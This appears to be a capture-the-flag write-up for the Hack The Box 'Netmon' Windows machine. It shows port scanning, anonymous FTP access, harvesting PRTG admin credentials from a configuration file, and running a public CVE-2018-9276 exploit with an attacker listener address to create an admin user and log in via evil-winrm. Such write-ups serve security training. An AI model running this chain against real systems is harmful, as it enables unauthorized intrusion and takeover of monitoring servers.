
## Intro


Tags: #windows #WebApp #ftp #OSCPpath #easy

------------
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.142.201 netmon.htb' | sudo tee -a /etc/hosts
```
## Port scan

```shell
sudo nmap -sV -sC -T4 -p- netmon.htb
```

```shell
Starting Nmap 7.94SwVN ( https://nmap.org ) at 2025-11-19 13:43 CST
Nmap scan report for netmon.htb (10.129.142.201)
Host is up (0.010s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-19T19:45:01
|_  start_date: 2025-11-19T19:32:16
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 18s, deviation: 0s, median: 18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.16 seconds
```


## WebApp enumeration (port 80)

#### HTTP header

```shelll
$ curl http://10.129.229.100/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
...
<p>You are using the Freeware version of <a href='https://www.paessler.com?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>PRTG Network Monitor</a>. We're glad to help you cover all aspects of the current state-of-the-art <a href='https://www.paessler.com/network_monitoring?utm_source=prtg&utm_medium=referral&utm_campaign=webgui-freeware'>network monitoring!</a>.
<span class="prtgversion">&nbsp;PRTG Network Monitor 18.1.37.13946 </span>
```

------------
# Foothold

### FTP

```shell
ftp netmon.htb
```
login with creds anonymous:anonymous

then navigate to find the user flag! 

then do
```shell
ls -al
```

```shell
229 Entering Extended Passive Mode (|||49956|)
150 Opening ASCII mode data connection.
02-25-19  10:44PM       <DIR>          Administrator
07-16-16  08:28AM       <DIR>          All Users
02-03-19  07:05AM       <DIR>          Default
07-16-16  08:28AM       <DIR>          Default User
07-16-16  08:16AM                  174 desktop.ini
01-15-24  10:03AM       <DIR>          Public
```
go to `all users`, then `Paessler`, then downloaded the file 
```shell
mget "PRTG Configuration"*
```
now locally search the file
```shell
grep -e "admin" -A 2 'PRTG Configuration.dat' 
```

#### creds obtained
found those creds
```shell
prtgadmin
PrTg@dmin2019
```

using the creds, we login on the webapp and we are redirected here
![](MediaFiles/Pasted%20image%2020260927132652.png)

----
# Privesc
## Vuln WebApp version exploitation

```shell
$ git clone https://github.com/wildkindcc/CVE-2018-9276.git
$ python CVE-2018-9276.py -h
$ sudo python3 exploit.py -i netmon.htb -p 80 --lhost 10.10.15.43 --lport 4445 --user prtgadmin --password PrTg@dmin2019
```
this exploit runs and successfully creates a new user with these creds `pentest:P3nT3st!`

### Shell as Administrator

```shell
evil-winrm -i netmon.htb -u pentest -p "P3nT3st!"
```

getting in, we can see we are `Administrator` , grabbed root flag
```powershell
cd Users\Administrator\Desktop type root.txt
```

---
# Summary


---

# Sidenotes



